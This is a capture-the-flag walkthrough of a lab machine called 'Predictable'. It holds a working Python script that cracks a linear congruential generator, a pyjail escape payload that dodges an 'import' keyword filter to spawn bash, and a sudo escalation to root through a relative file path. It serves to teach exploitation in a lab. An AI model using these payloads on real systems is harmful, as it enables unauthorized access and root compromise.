![Screenshot](/hard/Predictable/Images/machine.png)

Difficuly: **Hard**

Made by: **C4rta**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

## 🛠️  Techniques: Breaking a linear congruential generator (LSG), Escaping a pyjail, Reversing a binary "shell"

---

First of all we make sure that the machine is up, we can prove it with the command **ping**

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.147 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.132 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.127 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.127/0.135/0.147/0.008 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

To start our reconnaissance phase, we use **nmap** to know what ports are open in the target.

```java
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-30 14:18 -0500
Initiating ARP Ping Scan at 14:18
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 14:18, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:18
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 1111/tcp on 172.17.0.2
Completed SYN Stealth Scan at 14:19, 2.62s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2025-12-30 14:18:59 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 64
1111/tcp open  lmsocialserver syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see 2 ports open:

- port 22 (ssh / Secure Shell)
- port 1111 (???)

To know more about these ports like what services and versions are running on, we can use nmap once again to do this.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ nmap -p22,1111 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/Predictable/Images/image1.png)

As we can see is way more pretty and readable to the sight.

And we see that the port 1111 is a website, i'm going to use **whatweb** to know what technologies uses this website.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/enumeration]
└─$ whatweb http://172.17.0.2:1111
http://172.17.0.2:1111 [200 OK] Cookies[session], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.11.9], HttpOnly[session], IP[172.17.0.2], Python[3.11.9], Script, Title[Predictable], Werkzeug[3.0.3]
```

We can see that this website use python, and that's it, so let's take a look with our browser.

![Screenshot](/hard/Predictable/Images/image2.png)

We can see a lot of numbers a total of 99 different numbers and a seed, and we must also enter a number.

So let's see his source code.

```python
<!--

class prng_lcg:
	m =
	c =
	n = 9223372036854775783

	def __init__(self, seed=None):
		self.state = seed

	def next(self):
		self.state = (self.state * self.m + self.c) % self.n
		return self.state

# return int
def obtener_semilla():
	return time.time_ns()

def obtener_semilla_anterior():
	return obtener_semilla() - 1

if 'seed' not in session:
	session['seed'] = obtener_semilla()
gen = prng_lcg(session['seed'])

gen = prng_lcg(session['seed'])
semilla_anterior = obtener_semilla_anterior()

-->
```

The interesting part of this, as we can see is a python code inside of the source code from the website.

This python code basically is a **Linear Congruential Generator LSG** this code makes "random" numbers using different seeds.

But this Generator is particularly **insecure**, why?

This model of pseudo random generator of numbers if we use a seed to generate "random" numbers, isn't really generating random numbers, because if we once again generate those random numbers with the same seed, the result give us the same result as before, to understanding it better i'm going to make an example.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/exploits]
└─$ python3 example.py 

[+] Enter a seed: 64756794

[i] Generating random numbers...

2813504957
2908570468
2348181215
1424176670
547608145

[+] Enter a seed: 64756794

[i] Generating random numbers...

2813504957
2908570468
2348181215
1424176670
547608145
```

As we can see if we enter the same seed, the results are completely same, doesn't change anything.

This means if we know the value of the **Seed**, the values of **A**, **C** and **M** we can generate the same numbers and also predict the future ones.

The formula of a **LCG** is basically this:

$$
X_n+_1 = \ (a \cdot Xn + c) \ mod \ m
$$
In python representation:

```python
X = (a * X + c) % modulus
```

Where **Xn+1** is the new number generated and **Xn** is the number that was generated before.

- **a** -> is the **Multiplier**.
- **c** -> is the **Increment**.
- **m** -> Is the **Modulus**.

And with the python code that we got before, we already got the value of the **Modulus** and also the value of the **Seed**.

The value of the Modulus is: 

```c
m = 9223372036854775783
```

And the value of the Seed is generated by the actual time of the machine by nanoseconds, we can see that the python code imports the library **time**, and it shows the seed in the website.

![Screenshot](/hard/Predictable/Images/image3.png)

It show us the anterior seed, but don't worry because the python code is making the anterior seed just grabbing the actual seed and subtract 1.

So the actual seed is **1767127738**

And also the actual seed is reflected in our cookie.

cookie = **eyJzZWVkIjoxNzY3MTIzMDczfQ.aVQogQ.NHKHPHIMfkeGvrK2uJksHGVo0cM**

This cookie is on a format of **base64**

So let's **decode** it.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/exploits]
└─$ echo "eyJzZWVkIjoxNzY3MTI3NzM4fQ.aVQ6ug.3W0H1vq5exrD59UqAL1n391sy3g" | base64 -d
{"seed":1767127738}base64: invalid input
```

We can see the actual seed on the cookie.

Okay so we already got the **Seed** and the **Modulus**.

But what about the **Increment** and the **Multiplier**?

---
# Exploitation

There are a method to get first the Multiplier and then if we get the Multiplier we can also get the Increment.

How to get the Multiplier first?

Exists a lot of steps to get these values, but i'm going to use the direct method, this is the formula:

$$
Multiplier = (r_3 - r_2) \cdot (r_2 - r_1)^{-1} \ mod \ m
$$
In python representation:

```python
multiplier = (r3 - r2) * pow(r2 - r1, -1, modulus) % modulus
```

So we need at least 3 results, by luck of us we got even 99 results, so this is enough.

**Note**: If you want to know more about in detail how to broke a **LSG** you can take a look here in these resources:

- [Cracking RNGs: Linear Congruential Generators](https://msm.lt/posts/cracking-rngs-lcgs/)
- [Reverse engineering linear congruential generators](https://www.violentlymild.com/posts/reverse-engineering-linear-congruential-generators/)
- [Pseudo-Randomness – Breaking LCG](https://youtu.be/EdRK9Ap32Vg?si=V2s1SaBnXY5FSKaF)

And lastly to get the Increment is a simple formula that's the next one:

$$
Increment = (r_2 - r_1 \ \cdot multiplier) \ mod \ modulus
$$

In python representation:

```python
increment = (r2 - r1 * multiplier) % modulus
```

So we got all the things to break this and predict the number in the position 100!

This is the **exploit**:

```python
import sys, signal

def maGreen(text): return f'\033[92m{text}\033[00m'
def maYellow(text): return f'\033[93m{text}\033[00m'
def maBlue(text): return f'\033[94m{text}\033[00m'
def maBold(text): return f'\033[1m{text}\033[00m'

display_info = f'{maBold("[")}{maYellow("i")}{maBold("]")}'
display_pwned = f'{maBold("[")}{maGreen("!")}{maBold("]")}'
display_input = f'{maBold("[")}{maBlue("×")}{maBold("]")}'

pointing = "←(>▽<)ﾉ"

modulus = 9223372036854775783

def stop(sig, frame):
	print(f"{display_info} QUITTING...")
	sys.exit(1)

signal.signal(signal.SIGINT, stop)

def generate(x, multiplier, increment):
	all_nums = []

	for n in range(100):
		x = (x * multiplier + increment) % modulus
		all_nums.append(x)

	return all_nums[-1]


def execute():
	seed = int(input(f"{display_input} Enter the seed: "))

	r1 = int(input(f"\n{display_input} Enter the 1st result: "))
	r2 = int(input(f"{display_input} Enter the 2nd result: "))
	r3 = int(input(f"{display_input} Enter the 3rd result: "))

	multiplier = (r3 - r2) * pow(r2 - r1, -1, modulus) % modulus

	increment = (r2 - r1 * multiplier) % modulus

	print(f"\n{display_info} The value of the {maBold('multiplier')} is: {multiplier}")
	print(f"{display_info} The value of the {maBold('increment')} is: {increment}")

	final_num = generate(seed, multiplier, increment)

	print(f"\n{display_pwned} {maBold('PWNED!')} the 100 number is: {maBold(maGreen(final_num))} {maGreen(pointing)}")


if __name__ == "__main__":
	execute()
```

In this script we enter 3 results, and automatically, are going to make the math to get the value of the multiplier and the incrementor, once we have this, we are going to generate the same sequence to the number in the position 100.

So let's see if it works:

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/exploits]
└─$ python3 exploit.py 
[×] Enter the seed: 1767150943

[×] Enter the 1st result: 2550606061119791111
[×] Enter the 2nd result: 7346613280560341167
[×] Enter the 3rd result: 5794153166887891385

[i] The value of the multiplier is: 81853448938945944
[i] The value of the increment is: 7382843889490547368

[!] PWNED! the 100 number is: 3218022026791230586 ←(>▽<)ﾉ
```

And we got the final number that is on the position 100, so let's see if it works.

![Screenshot](/hard/Predictable/Images/image4.png)

And we got the credentials from the user **mash**, so let's login through **ssh**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/exploits]
└─$ ssh mash@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:BFX3OBp+y0aQxnKBckZRD0bX0Waq2Q16iiCYZ+bCOFc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
mash@172.17.0.2's password: 
Linux predictable 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Romper LCG y predecir numeros es divertido
______________________________________________________________________
Ahora escapa de mi pyjail
>
```

And we can see that we are in, but we can't enter any command and it shows that we need to escape from a **pyjail**.

In resume a **pyjail** we are inside of the interpret of python, but in a very limited way, only we can execute certain commands and other ones are like in a blacklist.

```python
> exec
Block: exec
> import os
Block: import
> import os; os.system("bash")
Block: import
> import pty; pty.spawn("/bin/bash")
Block: import
> whoami  
Error: name 'whoami' is not defined
> id
<built-in function id>
```

We can see that we can't use exec, os, import, open and other functions.

we can prove if we can use **subprocess** to run commands...

```python
> subprocess
Error: name 'subprocess' is not define
```

We can see that subprocess is not defined.

we can try to use this library to run commands on a system and get a shell.

Let's use ```__builtins__``` this is like a big dictionary that make way more easy to use certain functions in python like ```sum(), all(), exec()``` instead of doing every function by ourselves, even builtins have the function ```__import__()``` to try to get subprocess and execute code, inside of the machine.

you can use something like this:

```python
> globals()['__builtins__']
<module 'builtins' (built-in)>
```

But in my way I do it with this one is more like a direct method:

```python
> print.__self__
<module 'builtins' (built-in)>
```

so let's try to import subprocess with this.

```python
> print.__self__.__import__('subprocess').run(['bash'])
Block: import
```

it seems that every input that we enter, somehow from behind analyse the string, and try to find the word **import**, so how can we import subprocess?

We need to use a function of python that is **getattr()** this function can be useful like to get an attribute for something, like:

```python
>>> getattr(test, 'hello')
>>> # Is like doing something like this: test.hello
```

It receives the object that we want to work on, like ```__builtins__``` and the last value, the function needs a string, like ```__import__``` to get:

- ```__builtins__.__import__```

Okay but how can we enter **import** if automatically block our code?

remember that we can put strings in python together like: ```'__imp'+'ort__'```

So let's try to bypass this restriction with this method.

```python
> getattr(print.__self__, '__imp'+'ort__')('subprocess').run(['bash'])
mash@predictable:~$ whoami
mash
```

And finally we are inside in the machine!

---
# Privilege Escalation

If we execute **sudo -l** we can see that we have a privilege of **SUDOER**

```
mash@predictable:~$ sudo -l
Matching Defaults entries for mash on predictable:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mash may run the following commands on predictable:
    (root) NOPASSWD: /opt/shell
```

We can see that we can execute the binary **shell** that is located in **/opt/** and execute is as the user **root**.

Let's try to execute this **binary** as root see what happen.

```
mash@predictable:/opt$ sudo ./shell 
Uso: ./shell input
Pista: ./shell -h
```

It seems that we have a help menu.

```
mash@predictable:/opt$ sudo ./shell -h
¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado
```

It seems that in this system is installed **radare2**

But i'm going to use **Ghidra** because is more easy to read than pure assembly code, so i'm going to transfer this binary to me in the attack machine.

```ruby
mash@predictable:/opt$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And in our machine i'm going to use **wget** to download the binary.

```java
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/files]
└─$ wget http://172.17.0.2/shell
--2025-12-31 15:14:12--  http://172.17.0.2/shell
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15744 (15K) [application/octet-stream]
Saving to: ‘shell’

shell                                                       100%[============================================ >]  15.38K  --.-KB/s    in 0s      

2025-12-31 15:14:12 (344 MB/s) - ‘shell’ saved [15744/15744]
```

Okay so i'm going to execute **Ghidra** now.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/predictable/files]
└─$ ghidra
```

Okay so i'm going to take a look into the **main** function.

And i'm going to make a quick changes to make the function more readable.

```c
undefined8 main(int param_1,long param_2)

{
  int help_param;
  FILE *file;
  char *byte;
  
  if (param_1 == 2) {
    help_param = strcmp("-h",*(char **)(param_2 + 8));
    if (help_param == 0) { /* Help Menu */
      puts(&help_menu);
    }
    else {
      file = fopen("shell","r"); /* Reads a file in the working directory shell */
      fseek(file,6,0); /* The pointer reaches the 6th byte from the file shell */
      fread(byte,1,1,file); /* Reads the 6th byte */
      if ((*byte == '\x01') || (**(char **)(param_2 + 8) != '0')) {
        printf("Bleh~~\n");
      }
      else {
        system("/bin/bash");
      }
    }
  }
  else {
    puts("Uso: ./shell input");
    puts("Pista: ./shell -h");
  }
  return 0;
}
```

Here we can see better the **main** function. 

IF we enter a parameter, the script tries to read a file **"shell"** from the working directory and reads the 6th byte from this file, and does this:

IF the 6th byte from the file **shell** is equal to **\x01** **OR** the parameter that we enter is **NOT** equal to **0** the program are going to print the message **bleh~**

IF these 2 conditions are **NOT true** we are going to gain a shell with bash, and if you remember we can execute this as the user **root**.

But this is vulnerable, because the file shell doesn't have the full path, so we can move to another directory like **/tmp/** and make a file **shell**, that the 6th byte from this file is not equal to \x01, we can make that the 6th byte is \x00

Also enter the param be to 0, this is confusing, so you need to read and understand what does this code.

Then let's move to the directory **/tmp/** 

```r
mash@predictable:/opt$ cd /tmp
```

And let's make then the shell file.

```r
mash@predictable:/tmp$ echo '\x00\x00\x00\x00\x00\x00' > shell
```

So we are generating 6 Null bytes to the shell file.

Then let's execute the command shell that is located in the opt directory.

```c
mash@predictable:/tmp$ sudo /opt/shell 0
root@predictable:/tmp# whoami
root
```

We are root now ***...pwned..!*** 
